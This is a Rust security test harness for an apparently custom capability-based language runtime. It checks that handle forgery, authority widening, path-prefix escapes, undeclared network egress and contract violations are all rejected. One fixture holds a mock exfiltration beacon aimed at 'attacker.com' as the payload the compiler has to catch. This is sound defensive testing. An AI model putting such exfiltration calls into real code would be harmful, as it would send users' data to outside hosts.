use ordyn_effects::{EffectAnalyzer, EffectError};
use ordyn_guard::{AuditDecision, CapHandle, KernelError, SecurityKernel};
use ordyn_parser::Parser;
use ordyn_runtime::{RuntimeError, SandboxRuntime};
use ordyn_types::TypeChecker;

pub struct RedLabTestHarness;

impl RedLabTestHarness {
    /// Attack Vector 1: Synthetic Capability Handle Forgery
    /// An adversary fabricates an arbitrary integer handle hoping to guess a valid capability table slot.
    pub fn test_handle_forgery(attacker_entity: &str, forged_handle_val: u32) -> bool {
        let mut kernel = SecurityKernel::new();
        // Seed legitimate capabilities
        let _ = kernel.issue_root_capability("DatabaseAdmin", &["Read", "Write", "Drop"], "prod/");

        let result = kernel.authorize(
            attacker_entity,
            CapHandle(forged_handle_val),
            "Drop",
            "prod/users",
        );
        match result {
            Err(KernelError::InvalidHandle { .. }) => {
                // Must emit an audit log with decision Trapped
                let last_audit = kernel.audit_records().last().unwrap();
                matches!(last_audit.decision, AuditDecision::Trapped(_))
            }
            _ => false,
        }
    }

    /// Attack Vector 2: Authority Widening Attempt
    /// An entity holding a Read-only capability attempts to attenuate it into a Write capability.
    pub fn test_authority_widening_rejection() -> bool {
        let mut kernel = SecurityKernel::new();
        let read_cap = kernel.issue_root_capability("FileRead", &["Read"], "/app/logs");

        // Malicious attenuation: adding "Write"
        let res = kernel.attenuate(read_cap, &["Read", "Write"], "/app/logs");
        matches!(res, Err(KernelError::IllegalAttenuation { .. }))
    }

    /// Attack Vector 3: Prefix Escape Attempt
    /// An entity holding authority scoped to `/app/cache` attempts to broaden to root `/`.
    pub fn test_prefix_escape_rejection() -> bool {
        let mut kernel = SecurityKernel::new();
        let scoped_cap = kernel.issue_root_capability("CacheAccess", &["Read"], "/app/cache");

        let res = kernel.attenuate(scoped_cap, &["Read"], "/");
        matches!(res, Err(KernelError::IllegalAttenuation { .. }))
    }

    /// Attack Vector 4: Ambient Network Egress via Unhandled Effect
    /// A compromised entity attempts to execute an egress network call without declaring the Net effect.
    pub fn test_covert_network_egress_compile_rejection(source: &str) -> bool {
        let mut parser = match Parser::from_source(source) {
            Ok(p) => p,
            Err(_) => return false,
        };
        let program = match parser.parse_program() {
            Ok(p) => p,
            Err(_) => return false,
        };

        let mut analyzer = EffectAnalyzer::new();
        match analyzer.analyze_program(&program) {
            Err(EffectError::UnhandledEffect { effect, .. }) => effect == "Net",
            _ => false,
        }
    }

    /// Attack Vector 5: Contract Invariant Violation Trap
    /// An attacker attempts to withdraw more funds than available in a bank account.
    pub fn test_contract_violation_runtime_trap(source: &str, withdraw_amount: i64) -> bool {
        let mut parser = Parser::from_source(source).unwrap();
        let program = parser.parse_program().unwrap();

        let mut checker = TypeChecker::new();
        if checker.check_program(&program).is_err() {
            return false;
        }

        let mut lowerer = ordyn_ir::IrLowerer::new();
        let module = lowerer.lower_program(&program).unwrap();

        let mut runtime = SandboxRuntime::new(module, 500_000, 16);
        let exec_res = runtime.execute_function("withdraw", &[withdraw_amount]);
        matches!(exec_res, Err(RuntimeError::ContractViolation(_)))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn red_lab_test_capability_forgery_is_trapped() {
        assert!(RedLabTestHarness::test_handle_forgery(
            "InfiltratorEntity",
            0x1337
        ));
        assert!(RedLabTestHarness::test_handle_forgery(
            "InfiltratorEntity",
            999999
        ));
    }

    #[test]
    fn red_lab_test_authority_expansion_attacks_are_blocked() {
        assert!(RedLabTestHarness::test_authority_widening_rejection());
        assert!(RedLabTestHarness::test_prefix_escape_rejection());
    }

    #[test]
    fn red_lab_test_unauthorized_network_egress_is_caught_at_compile_time() {
        let attack_payload = r#"
            fn network_beacon(dest: String) -> Unit with [Net] {
                return;
            }

            fn legitimate_calculation() -> Int {
                network_beacon("https://attacker.com/exfiltrate");
                return 42;
            }
        "#;
        assert!(RedLabTestHarness::test_covert_network_egress_compile_rejection(attack_payload));
    }

    #[test]
    fn red_lab_test_contract_violation_triggers_runtime_trap() {
        let banking_source = r#"
            entity Vault {
                mut balance: Int;

                pub fn withdraw(amount: Int) -> Int
                    requires amount > 0 && amount <= 100 // Enforce max limit of 100
                {
                    self.balance = self.balance - amount;
                    return self.balance;
                }
            }
        "#;

        // Withdrawing 500 when limit is 100 must trap
        assert!(RedLabTestHarness::test_contract_violation_runtime_trap(
            banking_source,
            500
        ));
        // Withdrawing negative amount (-50) must trap
        assert!(RedLabTestHarness::test_contract_violation_runtime_trap(
            banking_source,
            -50
        ));
    }
}
